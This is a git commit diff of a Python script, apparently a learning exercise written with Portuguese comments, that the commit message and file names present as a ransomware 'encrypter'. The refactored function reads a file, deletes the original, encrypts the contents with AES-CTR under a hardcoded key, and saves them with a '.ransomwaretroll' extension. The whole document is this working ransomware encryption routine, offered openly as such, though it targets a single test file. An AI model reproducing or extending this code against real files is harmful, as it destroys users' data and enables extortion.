55b864aa04238c7b5609a3c0fb4fc72f441b4a5e
Felipe da Silva Rosa <felipedasvrosa@hotmail.com>
2024-12-07 15:54:29 -0300

    Melhorias no encrypter

--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,30 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+def encrypt_file(file_name, key):
+    try:
+        # Abrir o arquivo a ser criptografado
+        with open(file_name, "rb") as file:
+            file_data = file.read()
 
-## remover o arquivo
-os.remove(file_name)
+        # Remover o arquivo original
+        os.remove(file_name)
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+        # Criptografar os dados
+        aes = pyaes.AESModeOfOperationCTR(key)
+        crypto_data = aes.encrypt(file_data)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+        # Salvar o arquivo criptografado
+        new_file_name = file_name + ".ransomwaretroll"
+        with open(new_file_name, "wb") as new_file:
+            new_file.write(crypto_data)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+        print(f"Arquivo '{file_name}' criptografado com sucesso como '{new_file_name}'.")
+
+    except Exception as e:
+        print(f"Ocorreu um erro durante a criptografia: {e}")
+
+if __name__ == "__main__":
+    file_name = "teste.txt"
+    key = b"testeransomwares"
+    encrypt_file(file_name, key)
